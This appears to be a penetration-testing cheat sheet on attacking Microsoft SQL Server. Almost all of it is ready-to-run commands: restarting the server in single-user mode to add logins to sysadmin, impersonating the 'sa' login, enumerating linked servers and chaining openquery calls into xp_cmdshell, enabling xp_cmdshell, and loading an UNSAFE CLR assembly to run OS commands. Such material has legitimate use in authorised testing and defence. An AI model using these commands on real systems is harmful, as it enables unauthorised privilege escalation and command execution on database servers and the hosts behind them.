# MSSQL attacks

### SA single mode technique

{% hint style="info" %}
This technique can be used to add any user as SYSADMIN (sa).

It requires Local Administrator privilege on the box.
{% endhint %}

1. Stop the services (both server and agent)

![](<../../../../.gitbook/assets/image (205).png>)

&#x20;   2\. Using an elevated command prompt, start the server into Single Mode ( `-m`)

```csharp
"C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -m  -sSQLEXPRESS
```

![](<../../../../.gitbook/assets/image (223).png>)

&#x20; 3\. Download SQLCMD utility from Microsoft website:

{% embed url="https://go.microsoft.com/fwlink/?linkid=2142258" %}

&#x20; 4\. From an another cmd prompt, use SQLCMD to connect to the server:

```csharp
sqlcmd -S SQLUAT
```

&#x20; 5\. Grant sa access to anyone

```csharp
sp_addsrvrolemember 'crook\homer_potter', 'sysadmin'
GO
sp_addsrvrolemember 'crook\sqladmin', 'sysadmin'
GO
```

![](<../../../../.gitbook/assets/image (251).png>)

&#x20; 6\. Restart the SQL server as usual and enjoy.

![](<../../../../.gitbook/assets/image (213).png>)

### Impersonation&#x20;

#### List impersonation account

```c
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

### Login As

```csharp
EXECUTE AS LOGIN = 'sa'
```

### RPC out

#### Enumeration

```csharp
select * from master..sysservers
```

![](<../../../../.gitbook/assets/image (87).png>)

### Database Links

```csharp
select * from openquery("SERVER01", 'select * from master..sysservers')
```

```csharp
select * from openquery("sql1",'select * from openquery("server2",''select * from openquery("server3",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
```

### XP\_cmdshell Stored Procedures

#### shell

```csharp
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
exec master..xp_cmdshell "powershell ls /"
```

![](<../../../../.gitbook/assets/image (47).png>)

### Custom Assemblies

```
EXECUTE AS LOGIN = 'sa';
USE msdb;  EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ;
EXEC sp_configure 'clr enabled',1; RECONFIGURE ;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE ;
DROP PROCEDURE IF EXISTS dbo.cmdExec ;
DROP ASSEMBLY IF EXISTS myAssembly;
CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
EXEC cmdExec 'whoami';
```

![](<../../../../.gitbook/assets/image (116).png>)
